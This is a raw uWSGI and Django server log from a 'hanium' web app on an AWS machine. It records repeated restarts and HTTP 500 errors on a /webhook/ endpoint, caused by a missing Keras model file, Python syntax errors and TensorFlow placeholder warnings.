  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 11, in <module>
    from . import naverNlp
  File "./haniumapp/naverNlp.py", line 94, in <module>
    loaded_model = load_model('review_data.h5') #      
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/saving/save.py", line 189, in load_model
    loader_impl.parse_saved_model(filepath)
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/saved_model/loader_impl.py", line 114, in parse_saved_model
    constants.SAVED_MODEL_FILENAME_PB))
OSError: SavedModel file does not exist at: review_data.h5/{saved_model.pbtxt|saved_model.pb}
Thu Aug 27 04:40:47 2020 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /webhook/ (ip 66.102.6.205) !!!
Thu Aug 27 04:40:47 2020 - uwsgi_response_write_body_do(): Broken pipe [core/writer.c line 341] during POST /webhook/ (66.102.6.205)
OSError: write error
[pid: 3805|app: 0|req: 1/1] 66.102.6.205 () {42 vars in 540 bytes} [Thu Aug 27 04:40:11 2020] POST /webhook/ => generated 32611 bytes in 36235 msecs (HTTP/1.1 500) 5 headers in 157 bytes (0 switches on core 0)
0 / 50000
10000 / 50000
20000 / 50000
30000 / 50000
40000 / 50000
2020-08-27 04:55:39.018439: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-27 04:55:39.019869: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-27 04:55:39.021232: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 11, in <module>
    from . import naverNlp
  File "./haniumapp/naverNlp.py", line 94, in <module>
    loaded_model = load_model('review_data.h5') #      
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/saving/save.py", line 189, in load_model
    loader_impl.parse_saved_model(filepath)
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/saved_model/loader_impl.py", line 114, in parse_saved_model
    constants.SAVED_MODEL_FILENAME_PB))
OSError: SavedModel file does not exist at: review_data.h5/{saved_model.pbtxt|saved_model.pb}
Thu Aug 27 04:55:42 2020 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /webhook/ (ip 66.102.6.205) !!!
Thu Aug 27 04:55:42 2020 - uwsgi_response_write_body_do(): Broken pipe [core/writer.c line 341] during POST /webhook/ (66.102.6.205)
OSError: write error
[pid: 3805|app: 0|req: 2/2] 66.102.6.205 () {42 vars in 540 bytes} [Thu Aug 27 04:55:18 2020] POST /webhook/ => generated 32611 bytes in 24024 msecs (HTTP/1.1 500) 5 headers in 157 bytes (0 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Aug 27 05:03:02 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x560ee628bd00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x560ee628bd00 pid: 4042 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 4042, cores: 1)
2020-08-27 05:03:09.868016: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-08-27 05:03:09.868062: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.
2020-08-27 05:03:12.015760: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-08-27 05:03:12.015792: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-08-27 05:03:12.015807: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-08-27 05:03:12.016037: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-08-27 05:03:12.041440: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199915000 Hz
2020-08-27 05:03:12.041832: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x560ee9a4a8f0 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-08-27 05:03:12.041851: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-08-27 05:03:12.325926: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-27 05:03:12.327349: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-27 05:03:12.328730: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 11, in <module>
    from . import naverNlpsave
  File "./haniumapp/naverNlpsave.py", line 94, in <module>
    loaded_model = load_model('review_data.h5') #      
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/saving/save.py", line 189, in load_model
    loader_impl.parse_saved_model(filepath)
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/saved_model/loader_impl.py", line 114, in parse_saved_model
    constants.SAVED_MODEL_FILENAME_PB))
OSError: SavedModel file does not exist at: review_data.h5/{saved_model.pbtxt|saved_model.pb}
[pid: 4042|app: 0|req: 1/1] 66.102.6.203 () {42 vars in 540 bytes} [Thu Aug 27 05:03:09 2020] POST /webhook/ => generated 140287 bytes in 3034 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
Internal Server Error: /
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 12
    from . import review_data.h5
                             ^
SyntaxError: invalid syntax
[pid: 4042|app: 0|req: 2/2] 184.105.247.196 () {30 vars in 321 bytes} [Thu Aug 27 05:26:44 2020] GET / => generated 100876 bytes in 62 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Aug 27 05:57:41 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x5569255a8d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x5569255a8d00 pid: 4119 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 4119, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 12
    from . import review_data.h5
                             ^
SyntaxError: invalid syntax
[pid: 4119|app: 0|req: 1/1] 66.102.6.203 () {42 vars in 540 bytes} [Thu Aug 27 05:57:47 2020] POST /webhook/ => generated 101872 bytes in 69 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Aug 27 06:06:48 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x5628f85ddd00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x5628f85ddd00 pid: 4260 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 4260, cores: 1)
2020-08-27 06:06:59.355136: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-08-27 06:06:59.355169: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.
2020-08-27 06:07:01.485723: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-08-27 06:07:01.485754: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-08-27 06:07:01.485769: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-08-27 06:07:01.485995: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-08-27 06:07:01.509734: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199915000 Hz
2020-08-27 06:07:01.510124: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x5628fbdce0b0 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-08-27 06:07:01.510140: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-08-27 06:07:01.793312: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-27 06:07:01.794725: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-27 06:07:01.796099: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 118, in <module>
    loaded_model = load_model('review_data.h5') #      
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/saving/save.py", line 189, in load_model
    loader_impl.parse_saved_model(filepath)
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/saved_model/loader_impl.py", line 114, in parse_saved_model
    constants.SAVED_MODEL_FILENAME_PB))
OSError: SavedModel file does not exist at: review_data.h5/{saved_model.pbtxt|saved_model.pb}
[pid: 4260|app: 0|req: 1/1] 66.102.6.203 () {42 vars in 540 bytes} [Thu Aug 27 06:06:58 2020] POST /webhook/ => generated 129570 bytes in 3008 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Aug 27 06:12:34 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x555dedb8dd00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x555dedb8dd00 pid: 4308 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 4308, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 121
    def predict_pos_text(text):
      ^
SyntaxError: invalid syntax
[pid: 4308|app: 0|req: 1/1] 66.102.6.205 () {42 vars in 540 bytes} [Thu Aug 27 06:12:51 2020] POST /webhook/ => generated 101874 bytes in 69 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Thu Aug 27 06:15:29 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1033-aws #35-Ubuntu SMP Wed Aug 5 15:47:17 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x55e297796d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55e297796d00 pid: 4318 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 4318, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
